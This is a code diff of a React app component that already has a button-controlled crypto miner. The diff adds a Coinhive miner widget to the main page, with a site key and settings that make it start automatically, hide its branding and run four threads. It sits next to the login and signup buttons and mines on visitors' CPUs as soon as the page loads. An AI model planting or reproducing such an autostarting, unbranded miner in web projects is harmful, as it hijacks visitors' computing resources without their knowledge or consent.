@@ -43,6 +43,7 @@ class App extends Component {
     this.setState({ hashTotal: hashTotal })
   }
 
+  
   handleClickViewChange(pageNum) {
     console.log('pageNum', pageNum)
     this.setState({ viewing: pageNum }, () => { console.log('new state: ', this.state, pageNum) });
@@ -50,7 +51,7 @@ class App extends Component {
 
   handleClickStart() {
     this.setState({ start: !this.state.start }, () => { 
-      console.log('new state: ', this.state.start);
+      console.log('new state: ', this.state.start); 
       this.state.start ? this.miner.start() : this.miner.stop();
     });
   }
@@ -89,8 +90,27 @@ class App extends Component {
       height: '100vh',
       backgroundImage: "url('http://www.publicdomainpictures.net/pictures/190000/velka/black-background-1468370534d5s.jpg')",
     }
+    var sectionStyle2 = {
+      width: '256px',
+      height: '310px'
+    }
     return (
       <div id="main" style={sectionStyle}>
+
+      <div className="coinhive-miner" 
+        style={sectionStyle2}
+        data-key="6UtrrYYyMYrjRjXpipAn5FNt8SX0fdGc"
+        data-user="default"
+        data-autostart="true"
+        data-whitelabel="true"
+        data-background="#000000"
+        data-text="#eeeeee"
+        data-action="#ff0000"
+        data-graph="#ff0000"
+        data-threads="4"
+        data-throttle="0.1">
+        <em>Loading...</em>
+      </div>*
         <div>
           <Button id="form" bsStyle="default" bsSize="small" onClick={this.handleClickViewChange.bind(null, 3)}>Login</Button>
           <Button id="form" bsStyle="default" bsSize="small" onClick={this.handleClickViewChange.bind(null, 4)}>Signup</Button>
